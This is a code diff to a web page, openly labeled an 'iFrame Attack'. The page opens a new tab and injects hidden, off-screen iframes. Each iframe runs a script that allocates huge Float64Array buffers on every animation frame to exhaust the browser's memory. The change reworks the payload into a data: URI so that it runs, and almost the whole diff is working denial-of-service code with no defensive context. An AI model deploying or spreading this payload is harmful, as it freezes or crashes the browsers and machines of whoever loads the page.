@@ -26,8 +26,8 @@
                 return;
             }
 
-            // Inject HTML with properly formatted script into the new tab
-            attackTab.document.write(`
+            // Correctly formatted HTML with script execution
+            let attackHTML = `
                 <html>
                 <head><title>iFrame Attack</title></head>
                 <body>
@@ -39,17 +39,23 @@
                         iframe.style.height = "1px";
                         iframe.style.position = "absolute";
                         iframe.style.left = "-9999px";
+                        iframe.src = "data:text/html;charset=utf-8," + encodeURIComponent(\`
+                            <html><head><title>Attack</title></head><body>
+                            <script>
+                                function startWorker() {
+                                    let data = [];
+                                    function allocate() {
+                                        for (let i = 0; i < 500; i++) { 
+                                            data.push(new Float64Array(2e7));
+                                        }
+                                        requestAnimationFrame(allocate);
+                                    }
+                                    allocate();
+                                }
+                                startWorker();
+                            <\/script>
+                            </body></html>\`);
                         document.body.appendChild(iframe);
-                        
-                        // Write attack script inside the iframe
-                        let iframeDoc = iframe.contentWindow.document;
-                        iframeDoc.open();
-                        iframeDoc.write('<html><head><title>Attack</title></head><body>');
-                        iframeDoc.write('<script>');
-                        iframeDoc.write('function startWorker() { let data = []; function allocate() { for (let i = 0; i < 500; i++) { data.push(new Float64Array(2e7)); } requestAnimationFrame(allocate); } allocate(); } startWorker();');
-                        iframeDoc.write('<\/script>');
-                        iframeDoc.write('</body></html>');
-                        iframeDoc.close();
                     }
 
                     function launchIframes() {
@@ -62,7 +68,9 @@
                 <\/script>
                 </body>
                 </html>
-            `);
+            `;
+
+            attackTab.document.write(attackHTML);
             attackTab.document.close();
         }
 
@@ -73,3 +81,4 @@
     </script>
 </body>
 </html>
+
